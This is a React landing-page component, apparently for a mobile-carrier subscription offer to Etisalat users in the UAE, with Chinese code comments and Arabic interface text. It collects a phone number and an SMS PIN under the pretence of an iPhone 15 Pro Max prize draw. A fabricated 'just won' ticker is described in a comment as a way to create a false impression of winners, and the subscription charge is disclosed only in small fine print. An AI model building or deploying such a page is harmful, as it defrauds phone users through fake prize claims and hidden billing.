import { useState, useEffect } from 'react';

export default function Home() {
  const [clickId, setClickId] = useState('');
  const [msisdn, setMsisdn] = useState('');
  const [pin, setPin] = useState('');
  const [step, setStep] = useState(1);
  const [txid, setTxid] = useState('');
  const [message, setMessage] = useState('');
  const [loading, setLoading] = useState(false);

  // 获取 Voluum 的 click_id
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if (params.get('cid')) setClickId(params.get('cid'));
  }, []);

  // 呼叫后台获取 PIN (阿拉伯语报错提示)
  const handleRequestPin = async () => {
    if (!msisdn.startsWith('971') || msisdn.length < 10) {
      return setMessage('يرجى إدخال رقم اتصالات صحيح يبدأ بـ 971'); // 请输入正确的 971 开头号码
    }
    setLoading(true);
    setMessage('جاري التحقق... (Verifying...)');
    
    try {
      const res = await fetch('/api/request', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ msisdn, click_id: clickId })
      }).then(r => r.json());

      if (res.success) {
        setTxid(res.txid);
        setStep(2);
        setMessage('');
      } else {
        setMessage(`❌ فشل الطلب: ${res.error}`);
      }
    } catch (err) {
      setMessage('حدث خطأ في السيرفر');
    }
    setLoading(false);
  };

  // 呼叫后台验证 PIN (阿拉伯语报错提示)
  const handleVerifyPin = async () => {
    if (!pin) return setMessage('يرجى إدخال الرمز');
    setLoading(true);
    setMessage('جاري التأكيد... (Confirming...)');
    
    try {
      const res = await fetch('/api/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ txid, pin, click_id: clickId })
      }).then(r => r.json());

      if (res.success) {
        setStep(3);
        setMessage('');
      } else {
        setMessage('❌ الرمز غير صحيح، حاول مرة أخرى'); // PIN码错误
      }
    } catch (err) {
      setMessage('حدث خطأ في السيرفر');
    }
    setLoading(false);
  };

  return (
    // dir="rtl" 是灵魂，它会让整个网页自动从右向左排版，符合阿拉伯语习惯
    <div dir="rtl" style={{ fontFamily: '"Tajawal", "Cairo", Arial, sans-serif', textAlign: 'center', padding: '20px', backgroundColor: '#111111', minHeight: '100vh', color: '#ffffff' }}>
      
      {/* 顶部跑马灯：刺激用户心理，制造已经有人中奖的假象 */}
      <div style={{ backgroundColor: '#202020', padding: '10px', fontSize: '12px', color: '#ffd700', borderRadius: '5px', marginBottom: '20px', maxWidth: '450px', margin: '0 auto 20px auto', border: '1px solid #333' }}>
        ⚡️ فاز (أحمد م.) للتو بجهاز iPhone 15 Pro Max! 
      </div>

      <div style={{ maxWidth: '450px', margin: '0 auto', background: 'linear-gradient(145deg, #222222, #1a1a1a)', padding: '35px 25px', borderRadius: '16px', boxShadow: '0 10px 30px rgba(0,0,0,0.5)', border: '1px solid #333' }}>
        
        <h1 style={{ color: '#ffd700', margin: '0 0 15px 0', fontSize: '28px', textShadow: '0 2px 4px rgba(255, 215, 0, 0.3)' }}>
          🎁 السحب السنوي الأكبر! 🎁
        </h1>
        <p style={{ fontSize: '20px', fontWeight: 'bold', margin: '0 0 5px 0' }}>اربح <span style={{ color: '#ffd700' }}>iPhone 15 Pro Max</span> الجديد</p>
        <p style={{ color: '#888', fontSize: '14px', marginBottom: '25px' }}>*عرض حصري لمشتركي <span style={{color: '#71c21b', fontWeight: 'bold'}}>Etisalat</span> في الإمارات</p>

        {step === 1 && (
          <div style={{ animation: 'fadeIn 0.5s' }}>
            <p style={{ marginBottom: '15px', fontSize: '16px' }}>أدخل رقم هاتفك لتأكيد فرصتك في السحب:</p>
            <input 
              type="tel" 
              placeholder="مثال: 971501234567" 
              value={msisdn}
              onChange={(e) => setMsisdn(e.target.value.replace(/\D/g, ''))}
              style={{ width: '90%', padding: '15px', marginBottom: '20px', border: '2px solid #444', borderRadius: '8px', fontSize: '18px', textAlign: 'center', backgroundColor: '#333', color: '#fff', outline: 'none', direction: 'ltr' }}
            />
            <button 
              onClick={handleRequestPin} 
              disabled={loading}
              style={{ width: '90%', padding: '16px', backgroundColor: '#71c21b', color: '#000', border: 'none', borderRadius: '8px', fontSize: '20px', cursor: 'pointer', fontWeight: '900', boxShadow: '0 4px 15px rgba(113, 194, 27, 0.4)' }}
            >
              {loading ? 'انتظر...' : 'اشترك واربح الآن'}
            </button>
            <p style={{ color: '#666', fontSize: '11px', marginTop: '15px', lineHeight: '1.4' }}>
              بالضغط على الزر، أنت توافق على الشروط والأحكام. سيتم خصم رسوم الاشتراك من رصيدك.
            </p>
          </div>
        )}

        {step === 2 && (
          <div style={{ animation: 'fadeIn 0.5s' }}>
            <div style={{ backgroundColor: '#1e3313', padding: '10px', borderRadius: '8px', marginBottom: '20px', border: '1px solid #71c21b' }}>
              <p style={{ color: '#71c21b', margin: 0, fontWeight: 'bold' }}>✅ تم إرسال رمز PIN في رسالة قصيرة!</p>
            </div>
            <p style={{ marginBottom: '15px' }}>أدخل الرمز المكون من 4 أرقام لتأكيد اشتراكك:</p>
            <input 
              type="tel" 
              placeholder="----" 
              value={pin}
              maxLength={4}
              onChange={(e) => setPin(e.target.value.replace(/\D/g, ''))}
              style={{ width: '90%', padding: '15px', marginBottom: '20px', border: '2px solid #ffd700', borderRadius: '8px', fontSize: '24px', textAlign: 'center', letterSpacing: '10px', backgroundColor: '#333', color: '#fff', outline: 'none', direction: 'ltr' }}
            />
            <button 
              onClick={handleVerifyPin} 
              disabled={loading}
              style={{ width: '90%', padding: '16px', backgroundColor: '#ffd700', color: '#000', border: 'none', borderRadius: '8px', fontSize: '20px', cursor: 'pointer', fontWeight: '900', boxShadow: '0 4px 15px rgba(255, 215, 0, 0.4)' }}
            >
              {loading ? 'انتظر...' : 'تأكيد السحب'}
            </button>
          </div>
        )}

        {step === 3 && (
          <div style={{ animation: 'fadeIn 0.5s', padding: '20px 0' }}>
            <h2 style={{ color: '#71c21b', fontSize: '32px', margin: '0 0 15px 0' }}>🎉 مبروك! 🎉</h2>
            <p style={{ fontSize: '18px', lineHeight: '1.5' }}>تم تأكيد اشتراكك بنجاح. لقد دخلت السحب الرسمي.<br/>سنقوم بالاتصال بك في حال فوزك!</p>
          </div>
        )}

        <p style={{ color: '#ff4444', marginTop: '20px', minHeight: '24px', fontWeight: 'bold' }}>{message}</p>
      </div>
    </div>
  );
}